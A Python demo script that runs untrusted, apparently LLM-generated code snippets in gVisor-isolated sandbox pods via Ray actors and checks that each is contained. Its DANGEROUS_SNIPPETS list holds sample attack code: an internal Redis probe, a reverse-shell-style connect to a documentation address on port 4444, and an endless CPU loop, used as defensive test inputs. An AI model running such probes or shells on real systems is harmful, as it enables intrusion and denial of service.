"""
Demonstrates running untrusted Python code in Agent Sandbox pods from a
Ray job.

Each snippet below simulates code that, in a real agentic system, would
be generated at runtime by a large language model (e.g. an RL post-training
rollout, a tool-use agent, or a code-interpreter backend) and therefore
CANNOT be trusted to run on the Ray worker node directly. The example
fans those snippets out across a small fleet of Ray actors; each actor
owns one ephemeral, gVisor-isolated sandbox claimed from a SandboxWarmPool,
and executes its assigned snippet inside that sandbox.

The snippets are split into two groups:

  SAFE_SNIPPETS:      reasonable Python tasks; expected to succeed and
                      return useful stdout to the Ray driver.
  DANGEROUS_SNIPPETS: things you would never run on a host Python process
                      (cloud-metadata exfiltration, reverse-shell attempts,
                      CPU exhaustion). Each is expected to be CONTAINED by
                      a different sandbox guarantee (egress NetworkPolicy,
                      per-command timeout, gVisor's user-space kernel).

The driver prints per-snippet verdicts at the end so an operator can
verify the sandbox actually blocked what it was supposed to.

This is intentionally not a full RL loop - the point is to show the
Agent Sandbox integration cleanly. In a real RL pipeline, the
SandboxExecutor.execute() call below is what you would invoke from inside
your environment actor's step() method.
"""

import sys
import time

import ray

# Each snippet is (name, code). Code is treated as if it came from an
# untrusted source - we never inspect or sanitize it before sending it
# to the sandbox.

SAFE_SNIPPETS = [
    (
        "compute_fib.py",
        "a, b = 0, 1\n"
        "for _ in range(20):\n"
        "    a, b = b, a + b\n"
        "print(f'fib(20) = {a}')",
    ),
    (
        "json_aggregation.py",
        "import json\n"
        "data = [1, 4, 9, 16, 25]\n"
        "print(json.dumps({'mean': sum(data) / len(data), 'max': max(data)}))",
    ),
    (
        "string_processing.py",
        "text = 'agent sandbox demo'\n"
        "print({'words': len(text.split()), 'chars': len(text)})",
    ),
]

DANGEROUS_SNIPPETS = [
    # Attempts to make a lateral connection to a cluster-internal
    # RFC1918 address. In a real attack this represents reconnaissance
    # or pivot: enumerating other workloads, exploiting unauthenticated
    # internal APIs, hitting databases or admin endpoints reachable from
    # inside the cluster network. The `ray-native-pool-restrict-egress`
    # NetworkPolicy (shipped in sandbox.yaml alongside the SandboxTemplate)
    # default-denies all egress except DNS, so the TCP SYN is dropped at
    # the CNI before leaving the node. Expected outcome: snippet runs
    # inside the sandbox, socket.connect() raises TimeoutError, process
    # exits non-zero (blocked_at_sandbox - see DANGEROUS_EXPECTED).
    (
        "lateral_internal_probe.py",
        "import socket\n"
        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        "s.settimeout(3)\n"
        "# Arbitrary cluster-internal RFC1918 address. A real attacker\n"
        "# would scan known service ports (Redis 6379, etcd 2379, etc.).\n"
        "s.connect(('10.0.0.1', 6379))\n"
        "s.send(b'CONFIG GET *')",
    ),
    # Attempts to open a reverse shell to an attacker-controlled host.
    # Same `ray-native-pool-restrict-egress` NetworkPolicy blocks the
    # outbound connect; the target is RFC 5737 TEST-NET-1 (reserved for
    # documentation) so nothing routable would be reached even with the
    # policy absent. Expected outcome: snippet runs, socket.connect()
    # raises TimeoutError, process exits non-zero (blocked_at_sandbox).
    (
        "reverse_shell_attempt.py",
        "import socket\n"
        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        "s.settimeout(3)\n"
        "s.connect(('192.0.2.1', 4444))\n"
        "s.send(b'pwned')",
    ),
    # A tight CPU loop. On a Ray worker this would burn one of the
    # worker's threads indefinitely; in the sandbox, the SandboxClient's
    # HTTP read-timeout fires because the sandbox's HTTP server is
    # blocked synchronously on the never-returning Python process. The
    # SDK retries a few times then raises SandboxRequestError, which
    # SandboxExecutor.execute() catches and surfaces via the `error`
    # field with `exit_code: None`. Expected outcome: sdk_timeout
    # (see DANGEROUS_EXPECTED). Different from blocked_at_sandbox: the
    # code is still running inside the sandbox when we give up - that's
    # fine because deleting the SandboxClaim at cleanup destroys the pod.
    (
        "cpu_burn_loop.py",
        "while True:\n"
        "    pass",
    ),
]


# Per-snippet expected outcome for the dangerous snippets. These strings
# are NOT codes returned by the Agent Sandbox SDK - they are this demo's
# own classification of what an EXPECTED containment looks like, used
# only by is_contained() below. The naive "exit_code != 0 means
# contained" check would lump SDK failures (network blip, dead sandbox
# HTTP server) into the same bucket as legitimate sandbox-enforced
# denials, masking real bugs. Splitting the expected outcomes lets the
# demo report contained only when the OBSERVED failure mode matches the
# one we expect from each snippet:
#
#   runtime_blocked: the snippet RAN inside the sandbox and the
#     kernel/network refused the dangerous operation. result has
#     exit_code != 0 (non-None) and a Python traceback in stderr.
#
#   sdk_gave_up: the SDK gave up communicating with the sandbox (the
#     sandbox's HTTP server is held synchronously by the user code).
#     result has exit_code is None and `error` set.
DANGEROUS_EXPECTED = {
    "lateral_internal_probe.py": "runtime_blocked",
    "reverse_shell_attempt.py":  "runtime_blocked",
    "cpu_burn_loop.py":          "sdk_gave_up",
}


def is_contained(name: str, expected_class: str, result: dict) -> bool:
    """Return True if result matches the snippet's expected outcome.

    Safe snippets pass when exit_code == 0. Dangerous snippets pass only
    when they hit the specific failure mode DANGEROUS_EXPECTED predicts -
    not any failure. This is what stops a transient SDK / network issue
    from being silently scored as 'contained'.
    """
    ec = result.get("exit_code")
    error = result.get("error")
    if expected_class == "safe":
        return ec == 0
    expected_outcome = DANGEROUS_EXPECTED.get(name)
    if expected_outcome == "runtime_blocked":
        return ec is not None and ec != 0
    if expected_outcome == "sdk_gave_up":
        return ec is None and error is not None
    return False


def _status_label(exit_code: int | None) -> str:
    """One-word summary of how a sandbox call ended."""
    if exit_code == 0:
        return "SUCCEEDED"
    if exit_code is not None:
        return f"EXITED ({exit_code})"
    return "RAISED"


def _print_verdict(name: str, expected: str, result: dict, contained: bool) -> None:
    """Print one snippet's verdict block: header line + stdout/stderr/error previews."""
    verdict = "OK" if contained else "UNEXPECTED"
    print(f"\n[{verdict}] {name} (expected: {expected}) -> {_status_label(result.get('exit_code'))}")

    if result.get("stdout"):
        # Head of stdout is usually the relevant value (safe snippets print
        # a single result line).
        print(f"  stdout: {result['stdout'].strip()[:200]}")
    if result.get("stderr"):
        # Tail of stderr — the exception type+message lives at the bottom
        # of a Python traceback; slicing from the start would just show
        # mid-frame stdlib paths.
        stderr = result["stderr"].strip()
        if len(stderr) > 300:
            stderr = "..." + stderr[-300:]
        print(f"  stderr: {stderr}")
    if result.get("error"):
        print(f"  error: {result['error']}")


@ray.remote(num_cpus=0)
class SandboxExecutor:
    """A trusted Ray actor that owns one sandbox claimed from the WarmPool.

    Each instance:
      - claims one sandbox at __init__ (sub-200ms thanks to the WarmPool;
        without it, this would take 30s+ for image pull + gVisor boot)
      - exposes execute() which writes the snippet to the sandbox and
        runs it under a short timeout
      - deletes the sandbox at cleanup() (the pool controller has
        already provisioned a fresh sandbox to backfill the slot;
        sandboxes are never returned to the pool, only replaced)
    """

    def __init__(self, worker_id: int):
        from k8s_agent_sandbox import SandboxClient
        from k8s_agent_sandbox.models import SandboxInClusterConnectionConfig

        self.worker_id = worker_id

        # use_pod_ip=True bypasses the cluster Service and routes the
        # SDK's HTTP traffic straight to the sandbox pod IP. This is the
        # "Decoupled Direct Proxy" model - useful in distributed Ray
        # workloads where every avoided hop matters.
        self.client = SandboxClient(
            connection_config=SandboxInClusterConnectionConfig(
                use_pod_ip=True,
                server_port=8888,
            ),
            cleanup=True,
        )

        t_claim = time.time()
        self.sandbox = self.client.create_sandbox(
            template="python-runtime-sandbox",
            warmpool="python-runtime-pool",
        )
        claim_latency = time.time() - t_claim
        print(
            f"[executor-{worker_id}] adopted sandbox "
            f"'{self.sandbox.claim_name}' in {claim_latency:.3f}s"
        )

    def execute(self, name: str, code: str, timeout: int = 5) -> dict:
        """Write the snippet to the sandbox and run it.

        Always returns a result dict; never raises - the caller iterates
        over results uniformly regardless of per-snippet outcome.
        """
        try:
            # `name` already includes the .py extension (see SAFE_SNIPPETS
            # / DANGEROUS_SNIPPETS) — the snippet's identifier IS the
            # filename written to the sandbox, so no further munging here.
            self.sandbox.files.write(name, code)
            t0 = time.time()
            res = self.sandbox.commands.run(f"python {name}", timeout=timeout)
            duration = time.time() - t0
            return {
                "name": name,
                "exit_code": res.exit_code,
                "stdout": res.stdout,
                "stderr": res.stderr,
                "duration": duration,
            }
        except Exception as e:
            return {
                "name": name,
                "exit_code": None,
                "error": f"{type(e).__name__}: {e}",
            }

    def cleanup(self):
        self.client.delete_sandbox(self.sandbox.claim_name)


def main() -> int:
    """Run the demo and return a process exit code.

    Returns 0 only when every snippet hit its expected outcome; non-zero
    otherwise. Returning a real exit code lets the wrapping RayJob's
    status reflect containment failures - a Succeeded RayJob would
    otherwise mask cases where dangerous snippets weren't actually
    contained.
    """
    ray.init()

    NUM_EXECUTORS = 3
    pass_count = 0
    total_snippets = 0
    executors = []

    try:
        print(
            f"\nSpinning up {NUM_EXECUTORS} SandboxExecutor actors, each claiming "
            f"one sandbox from the 'ray-native-pool' WarmPool..."
        )
        executors = [SandboxExecutor.remote(worker_id=i) for i in range(NUM_EXECUTORS)]

        # Combine safe + dangerous, label each so we can verify outcomes.
        all_snippets = [
            (name, code, "safe") for name, code in SAFE_SNIPPETS
        ] + [
            (name, code, "dangerous") for name, code in DANGEROUS_SNIPPETS
        ]
        total_snippets = len(all_snippets)

        print(
            f"\nDispatching {total_snippets} snippets across {NUM_EXECUTORS} "
            f"sandbox executors (Ray fans them out in parallel)..."
        )

        # Round-robin snippets across executors. Ray schedules them concurrently.
        futures = [
            executors[i % NUM_EXECUTORS].execute.remote(name, code)
            for i, (name, code, _expected) in enumerate(all_snippets)
        ]
        results = ray.get(futures)

        print("\n" + "=" * 60)
        print("Execution Results")
        print("=" * 60)

        for (name, _code, expected), result in zip(all_snippets, results):
            contained = is_contained(name, expected, result)
            if contained:
                pass_count += 1
            _print_verdict(name, expected, result, contained)

        print("\n" + "=" * 60)
        print(f"Summary: {pass_count}/{total_snippets} snippets behaved as expected")
        print("=" * 60)
    finally:
        # ALWAYS release claimed sandboxes, even if dispatch or result
        # handling raised. Without this, a mid-run exception would leave
        # NUM_EXECUTORS sandbox claims hanging in the WarmPool until manual
        # cleanup. Cleanup errors are surfaced but never re-raise (we don't
        # want to mask the original exception, if any).
        if executors:
            print(
                "\nDeleting sandbox claims "
                "(the pool controller will keep the pool replenished)..."
            )
            try:
                ray.get([e.cleanup.remote() for e in executors])
            except Exception as cleanup_err:
                print(
                    f"WARNING: sandbox cleanup encountered errors: {cleanup_err}",
                    file=sys.stderr,
                )
        ray.shutdown()
        print("\nDone.")

    # Non-zero exit when any snippet missed its expected outcome - the
    # wrapping RayJob will surface as Failed so automation/operators get
    # a true signal rather than a false green.
    return 0 if pass_count == total_snippets and total_snippets > 0 else 1


if __name__ == "__main__":
    sys.exit(main())
